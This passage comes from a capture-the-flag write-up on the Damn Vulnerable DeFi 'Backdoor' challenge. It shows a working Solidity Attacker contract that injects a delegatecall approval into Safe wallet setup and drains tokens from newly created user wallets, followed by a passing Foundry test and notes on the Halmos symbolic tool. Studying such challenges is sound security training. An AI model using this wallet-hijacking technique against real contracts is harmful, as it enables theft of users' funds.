                SafeProxyFactory _factory, 
                WalletRegistry _registry, 
                address _singleton, 
                address _recovery) {
        token = _token;
        factory = _factory;
        registry = _registry;
        singleton = _singleton;
        recovery = _recovery;
    }

    function handle_delegatecall(DamnValuableToken _token, address attacker) public {
        _token.approve(attacker, 10e18);
    }

    function attack(address[] calldata users) public {
        for (uint i = 0; i < 4; i++){
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory attacking_data = abi.encodeCall(
                this.handle_delegatecall, (token, address(this)));

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(this),
                    attacking_data,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy wallet = factory.createProxyWithCallback(singleton, initializer, 1, IProxyCreationCallback(registry));

            token.transferFrom(address(wallet), recovery, 10e18);
        }
    }
}
```
`test_backdoor`:
```solidity
function test_backdoor() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(token, walletFactory, walletRegistry, address(singletonCopy), recovery);
    attacker.attack(users);
}
```
Run:
```javascript
$ forge test --mp test/backdoor/Backdoor.t.sol
...
Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
[PASS] test_assertInitialState() (gas: 62853)
[PASS] test_backdoor() (gas: 2167005)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.43ms (1.69ms CPU time)      
```
Success!
## Fuzzing?
According to tradition, this should be some effort "to fit a square peg into a round hole" and somehow make fuzzing engine work in the current problem. But, in fact, we are unlikely to find any "academic novelty" in this. We have already seen how Echidna behaves in tasks with a high level of abstraction and how unnatural, inconvenient and even "fraudulent" it seems to prepare for such a solution to the problem using the example of [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/selfie/test/selfie#fuzzing-vs-selfie). Therefore, in this article I will not torture myself or the reader, and we will abandon the search for a solution through fuzzing. But I'd be happy to look at someone's elegant solution via fuzzing, if it exists. I will be glad to be wrong in my conclusions :D.

## Conclusions
1. Halmos has proven itself to be a powerful tool even in the case of such contracts overloaded with abstractions. The main thing is to meticulously deal with code coverage and skillfully use optimizations with heuristics.
2. It is very convenient and probably most correct to handle symbolic `delegatecalls` through such special `handle_delegatecall` as shown in the article.
3. On the example of `owners` list and **SafeProxy's** `fallback`, sometimes it is necessary to change the very logic of implementation of some features of target contracts so that Halmos can cope with them.
4. Once again, we make sure that checking your custom invariants based on the business logic of target contracts is a good idea. Thanks to the addition of such an invariant (allowance), we completed the task in one symbolic transaction.
5. Halmos can sometimes behave erratically under high load. Using non-optimistic options can help make Halmos work more deterministic.